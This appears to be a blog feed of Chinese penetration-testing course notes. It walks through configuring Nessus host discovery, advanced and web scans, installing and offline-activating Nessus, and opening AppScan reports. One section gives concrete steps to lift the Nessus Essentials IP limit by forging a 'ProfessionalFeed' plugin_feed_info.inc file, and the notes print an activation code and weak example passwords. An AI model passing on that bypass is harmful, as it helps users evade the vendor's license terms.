src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/9f4dc31931d04fccae316141d8bc6c3f.png" alt="image.png"></p><p>10.点击【证书】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a7c908efe8444f4eae6a37a90c7fa3dd.png" alt="image.png"></p><p>11.点击【HTTP】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a83dc3e5b4814ce3b38c45e0b8d68379.png" alt="image.png"></p><p>12.选择身份验证方法【自动认证】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/bf47d655d7754bf0867b0b8b3a12e173.png" alt="image.png"></p><p>13.输入用户名【xiaogang】，密码【123456】（需要扫描网站的用户名和密码）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/dc040e35f171464482f0922aa58491ff.png" alt="image.png"></p><p>14.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c36226d195f94681bd294fc12f13eece.png" alt="image.png"></p><p>15.确认是否在可用的扫描插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/ed665f405a0547ec9f301ec455040870.png" alt="image.png"></p><p>16.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4a820525dba34f2ca51513670b0fc63e.png" alt="image.png"></p><p>17.选择【web扫描】，点击后边的【小三角】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/3e5fbe3b52504eefae3df12b42e4561f.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/064b9a7184534364a04215d195b1c29b.png" alt="image.png"></p><p>18.点击【web扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/52b4c83c31d34caf87530813de3952cd.png" alt="image.png"></p><p>19.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c98d001614bb4fa9b675d16ed08b4885.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/1ecb527fb62442d8bc7f3f66cf2ca4d6.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-3-jie-nessus-gao-ji-sao-miao/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-3-jie-nessus-gao-ji-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="nessus高级扫描"><a href="#nessus高级扫描" class="headerlink" title="nessus高级扫描"></a>nessus高级扫描</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">cd nessussh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.进入nessus网站，点击【new Scan】</p><pre class="line-numbers language-none"><code class="language-none">https://kaliip:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2c2ffafb93224ebc93afafe4e60205a6.png" alt="image.png"></p><p>3.选择【adVanced Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4b0472b99dad4eeaa167296afbe686f6.png" alt="image.png"></p><p>4.输入Name【高级扫描】，Description【高级扫描】，Targets【需要扫描的ip】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/fa67076b941a4560931eff0d7e6402dd.png" alt="image.png"></p><p>5.点击【 Schedule】</p><p>这里是配置定时任务的，可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/9ddf0e54c7e84387b0f01d53eee31e1c.png" alt="image.png"></p><p>6.点击【 Notifications】</p><p>这里主要是配置邮件提醒的，可以配置也可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ae35754b03ed48659a0f1532fa3ba68d.png" alt="image.png"></p><p>7.点击【Discovery 】，点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/22517e11d91146c588f52f474972889e.png" alt="image.png"></p><p>8.点击【Port Scanning】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/0d89b04664654f7da3b03400675244f7.png" alt="image.png"></p><p>9.点击【Service Discovery】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/aa6a279e953b4fab8b7e2bc86c73d61d.png" alt="image.png"></p><p>10.点击【ASSESSMENT】，点击【general】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/6c0868e2b7b5431db222a8730137c0bd.png" alt="image.png"></p><p>11.点击【Brute Force】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ca890cc0fcf3413cbfcb5e37dccd2a75.png" alt="image.png"></p><p>12.点击【SCADA】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4d068852466b4a5c8cfa60c1e467d760.png" alt="image.png"></p><p>13.点击【Web Application Settings】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/443875aa60784a0ba4ac9474f669b447.png" alt="image.png"></p><p>14.点击【Windows】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2da89cbf88494f2c89117281bf7f5a06.png" alt="image.png"></p><p>15.点击【Malware 】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ffbdf0e4f0d1405fb4c0f300b4dce573.png" alt="image.png"></p><p>16.点击【Database】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ba1e37e085ae49b384488d7dd7b02bf2.png" alt="image.png"></p><p>17.点击[REPORT]</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e70c22e594534560812685745ecd861a.png" alt="image.png"></p><p>18.点击【ADVANCED】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4991e91caf0c4fbdb5c4685c66553cd3.png" alt="image.png"></p><p>19.点击【Credentials 】，选则【windows】，输入账户密码（必须输入）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5a3dea619e0443c39bfcf3998aeb3fcb.png" alt="image.png"></p><p>20.点击【Plugins】</p><p>所有的扫描服务，都是由插件提供的</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/b5c28355b94a47e2bcd739c7805c18ee.png" alt="image.png"></p><p>21.点击【Save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/10b06f0b62794a5684b16d25be5fda52.png" alt="image.png"></p><p>22.点击【高级扫描】，点击【More】，点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/c32b8e2986a94c41825952aa9b5556fb.png" alt="image.png"></p><p>23.点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/67c1160a61ed4f4888885028f23f80d9.png" alt="image.png"></p><p>24.点击【高级扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/d5ba69b703904698b6b1d338255f2563.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2ee335411d2741738f14131e5794d87e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5ee2d857b1af45edbf67f3e7e865b302.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e6a0d4b88eb548fa8deeafc16922ddcd.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-2-jie-nessus-host-discovery/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-2-jie-nessus-host-discovery/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-Host-Discovery"><a href="#Nessus-Host-Discovery" class="headerlink" title="Nessus Host Discovery"></a>Nessus Host Discovery</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">sh /root/nessus/qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.进入nessus网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7ab2d5aa1c7a436d9a4236390971d873.png" alt="image.png"></p><p>3.点击【New Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/ae91d3e49a014ce4bf5d16e14d4c009a.png" alt="image.png"></p><p>4.选择【Host Discovery】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/6314833fd6b24fc482bbf884bdeb3bd4.png" alt="image.png"></p><p>5.输入name【主机发现】，Description【主机发现】，Targets【192.168.70.0/24】,点击【Save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/9af5119ff47a41ef9f14fc1edd751799.png" alt="image.png"></p><p>6.点击【 Schedule】</p><p>这里是配置定时任务的，可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/32d9e17742fa4afb8942d1cf5db96ba6.png" alt="image.png"></p><p>7.点击【 Notifications】</p><p>这里主要是配置邮件提醒的，可以配置也可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c65ec8c79ceb4e16a91630ce6bfcddf5.png" alt="image.png"></p><p>8.点击【Discovery 】</p><p>这里选择常用端口扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7c9a0ee9cc2b48bfa166e80f991819c5.png" alt="image.png"></p><p>9.点击【Report 】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a768bfa493014b299c4cf4aca1346474.png" alt="image.png"></p><p>10.点击【Advanced 】</p><p>这里是高级设置选项</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/07171ac22bdb481a97298199b7a36636.png" alt="image.png"></p><p>11.点击【Plugins】</p><p>这里是配置插件的地方，主机发现不要配置插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/1b538e5621c64332a3ee06cd862080b0.png" alt="image.png"></p><p>12.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/193ae3a3dbd145b88480bb71deb6e721.png" alt="image.png"></p><p>13.点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/2fe3b92bf40640bea04bc8ecbb12a487.png" alt="image.png"></p><p>14.点击【More】，点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7abedbdf5cb94f9faafa11eec2017cca.png" alt="image.png"></p><p>15.点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/bda6368a8f0a48d5a42370ce5a7bf537.png" alt="image.png"></p><p>16.点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/de021dcff58f431c9ceee57cd0354fae.png" alt="image.png"></p><p>17.查看扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a9678c7f935a4213bfdd401d11ed91ae.png" alt="image.png"></p><p>18.选择其中一个主机查看</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/0a1af822d924498bb1c20ed9a3675b4e.png" alt="image.png"></p><p>19.查看具体的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c8b48d3a6f4241d6a9be2a6bf3b678e3.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-1-jie-nessus-jie-shao-yu-an-zhuang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-1-jie-nessus-jie-shao-yu-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus介绍与安装"><a href="#Nessus介绍与安装" class="headerlink" title="Nessus介绍与安装"></a>Nessus介绍与安装</h1><h2 id="1-Nessus简介"><a href="#1-Nessus简介" class="headerlink" title="1.Nessus简介"></a>1.Nessus简介</h2><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus也是渗透测试重要工具之一</p><h2 id="2-kali安装Nessus"><a href="#2-kali安装Nessus" class="headerlink" title="2.kali安装Nessus"></a>2.kali安装Nessus</h2><p>1.访问Nessus官网</p><pre class="line-numbers language-none"><code class="language-none">https://www.tenable.com/downloads/nessus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/1dde7c7b4ec645cba3c61b1e8a5ca73f.png" alt="image.png"></p><p>或者下载课程资料里的安装包【Nessus-10.1.1-debian6_amd64.deb】到kali</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/22505ff746a648c397bf5dc2cef5a7a2.png" alt="image.png"></p><p>2.安装Nessus程序</p><pre class="line-numbers language-none"><code class="language-none">dpkg -i Nessus-10.1.1-debian6_amd64.deb <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/071d1f15c17c42f381975763adf711d0.png" alt="image.png"></p><p>You can start Nessus Scanner by typing /bin/systemctl start nessusd.service 启动服务命令</p><p>Then go to <a href="https://kali:8834/">https://kali:8834/</a> to configure your scanner  访问地址</p><p>3.启动Nessus</p><pre class="line-numbers language-none"><code class="language-none">service nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看kali的ip</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f892a26fccf8481fa9f5f687c26c1a58.png" alt="image.png"></p><p>5.浏览器访问nessus的web网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/d7e0366737ee4e91b5e16b403792ae4b.png" alt="image.png"></p><p>6.选择 【Managed Scanner】选项，点击【Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f8c1d51f75694259b6a4cd4ce504dfea.png" alt="image.png"></p><p>7.选择【Tenable.sc】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/80ba631a892e4a089673aedb0df08804.png" alt="image.png"></p><p>8.点击【Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/3f4f08d4a8544277ae02f174a8e62ecc.png" alt="image.png"></p><p>9.输入用户名【admin】，输入密码【123456】，点击【Submit】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/8021cf24bd45404eaeba0b0fae793bd5.png" alt="image.png"></p><p>10.等待配置插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/86313f9a1137476c8a1a0d023c89069b.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/565d98fe895c431eb8504e1814f9403d.png" alt="image.png"></p><p>安装完成后是这样的界面,尚未激活,不能扫描,此时只有一个设置按钮,并无扫描按钮.</p><h2 id="3-离线激活Nessus"><a href="#3-离线激活Nessus" class="headerlink" title="3.离线激活Nessus"></a>3.离线激活Nessus</h2><ol><li>去nessus官方申请激活码，姓名随便填，邮箱必须正确，用来接收激活码</li></ol><pre class="line-numbers language-none"><code class="language-none">https://zh-cn.tenable.com/products/nessus/nessus-essentials<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2e042a1b3bc24ebe96668f68b6ccd487.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b89303b62eee43bc99b9d7c3739212f2.png" alt="image.png"></p><p>2.进入填写的邮箱获取激活码</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b2d9202c94c4da080936d485a3c2c83.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/24bf49a1d16e4261a1d30d92ec805d5b.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">D2ZV-D7UM-M75X-E4A3-HAVL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.获得质询码（challenge code）</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli fetch  --challenge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/97008ee858754d229d82981cc26b7a62.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">7ae75a7a1eadd542fbc17e4a4c0ad8a95de94da1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.获取离线插件包地址及激活证书</p><p>浏览器打开网页 <a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a> ，输入申请的激活码，以及上一步得到的质询码，点击【Submit】</p><pre class="line-numbers language-none"><code class="language-none">https://plugins.nessus.org/v2/offline.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/dad3f4a3b1804e7e88742ace5246b2f2.png" alt="image.png"></p><p>5.得到更新插件地址，及license证书</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/c2f6d9b61f25438c838edc005ac099cc.png" alt="image.png"></p><p>6.下载更新包，下载证书nessus.license。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/045c0b7dccda4006a172bbe12979e312.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9788ef99b5ce4621ae1e644285f43ed2.png" alt="image.png"></p><p>7.将下载好的激活证书和插件包复制到kali</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4f9d3d443be24573a4e003cdad62294d.png" alt="image.png"></p><p>8.离线激活nessus</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli fetch --register-offline ./nessus.license<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4da74bfab4124d49824c08fabcfbb02f.png" alt="image.png"></p><p>您的激活码已正确注册-谢谢。</p><p>9.安装插件包</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz/opt/nessus/lib/nessus/plugins/  #插件包目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3602dbf8e98c41b08e2698986e81f194.png" alt="image.png"></p><p>10.重启nessus</p><pre class="line-numbers language-none"><code class="language-none">service nessusd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2f8e50f756dd4a4797a7e0f9bc2213fa.png" alt="image.png"></p><p>11.重新访问nessus网站，等待加载插件【耗时较长,需要耐心等待】</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/settings/about<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b16c2d94b5d4440b025297ec1f9b6f5.png" alt="image.png"></p><p>完成后进入nessus系统。显示激活成功，具有了scan功能。但显示仅允许扫描16个IP。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b2def339468746fdbd114bed1f43d1d3.png" alt="image.png"></p><h2 id="4-解除IP限制"><a href="#4-解除IP限制" class="headerlink" title="4.解除IP限制"></a>4.解除IP限制</h2><p>1.获取当前plugins的版本。</p><pre class="line-numbers language-none"><code class="language-none">https://plugins.nessus.org/v2/plugins.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3032df10296340a5bcba5e1d51445822.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">202212100752<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.停止nessus服务</p><pre class="line-numbers language-none"><code class="language-none">service nessusd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.创建 plugin_feed_info.inc</p><pre class="line-numbers language-none"><code class="language-none">vi plugin_feed_info.inc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下，并将刚刚获取到的版本号替换如下内容中的数字串。</p><pre class="line-numbers language-none"><code class="language-none">PLUGIN_SET = "202212100752";PLUGIN_FEED = "ProfessionalFeed (Direct)";PLUGIN_FEED_TRANSPORT = "Tenable Network Security Lightning";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4.将plugin_feed_info.inc替换到 /opt/nessus/var/nessus/plugin_feed_info.inc</p><pre class="line-numbers language-none"><code class="language-none">cp plugin_feed_info.inc /opt/nessus/var/nessus/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.将 /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc 文件删除。</p><pre class="line-numbers language-none"><code class="language-none">rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.启动nessus服务</p><pre class="line-numbers language-none"><code class="language-none">service nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.访问Nessus，windows打开浏览器，访问nessus，会看到nessus初始化插件，完成后，看设置页面显示 unlimited。表示解除IP限制成功。</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.3.47:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/be568c6057e74ea59f2f4a61bbad1fd2.png" alt="image.png"></p><h2 id="5-解决Nessus重启失效后遗症"><a href="#5-解决Nessus重启失效后遗症" class="headerlink" title="5.解决Nessus重启失效后遗症"></a>5.解决Nessus重启失效后遗症</h2><p>由于Nessus服务每次重启后，都会重置plugin_feed_info.inc，这将会使nessus/plugins目录下所有的插件都被删除，无法扫描。因此要将nessus服务设置为手动，并且先停止nessus服务。可以写成批处理解决此问题</p><p>1.编写启动脚本</p><pre class="line-numbers language-none"><code class="language-none">vi qd_nessus.shservice nessusd stop;cp /root/nessus/plugin_feed_info.inc /opt/nessus/var/nessus/;rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc;service nessusd start;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次需要启动nessus时 输入启动命令</p><pre class="line-numbers language-none"><code class="language-none">sh /root/nessus/qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.nessus命令合集</p><pre class="line-numbers language-none"><code class="language-none">#启动service nessusd start;#重启service nessusd restart;#查看状态service nessusd status#停止服务service nessusd stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.遇到的坑及相应的解决办法</p><p>在解除ip限制的过程中，如果已经解除成功，但是新建扫描项目时，发现很快就结束，无扫描结果。此时查看plugins目录内容是否被删除。</p><pre class="line-numbers language-none"><code class="language-none">du -h /opt/nessus/lib/nessus/plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/e89f232f79234dfabfe2419db15ac273.png" alt="image.png"></p><p>正常情况下，该目录应该在1.4G左右。如远远低于此数值。请按如下步骤操作：</p><pre class="line-numbers language-none"><code class="language-none">service nessusd stop;/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gzsh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后打开浏览器，正常访问nessus。（<a href="https://192.168.70.3:8843）静待plugins更新完成。">https://192.168.70.3:8843）静待plugins更新完成。</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-6-jie-appscan-sao-miao-bao-gao/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-6-jie-appscan-sao-miao-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="第六节-AppScan扫描报告"><a href="#第六节-AppScan扫描报告" class="headerlink" title="第六节-AppScan扫描报告"></a>第六节-AppScan扫描报告</h1><h2 id="1-加载扫描结果"><a href="#1-加载扫描结果" class="headerlink" title="1.加载扫描结果"></a>1.加载扫描结果</h2><p>1.点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/6113b3be3e3f4823b6e8a3299a4168b2.png" alt="image.png"></p><p>2.选择之前保存过的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5a5205ed79b54851b4d2ab9b00e3b94e.png" alt="image.png"></p><p>3.等待加载完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4cdd51d08f5c48188c7a4c76a2a1af52.png" alt="image.png"></p><h2 id="2-领导查看的报告"><a href="#2-领导查看的报告" class="headerlink" title="2.领导查看的报告"></a>2.领导查看的报告</h2><p>1.点击【报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/147bde4944b941558a599f08ff29cdde.png" alt="image.png"></p><p>2.模板选择为【缺省值】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fda3f723caab4dabb81cee31211c0197.png" 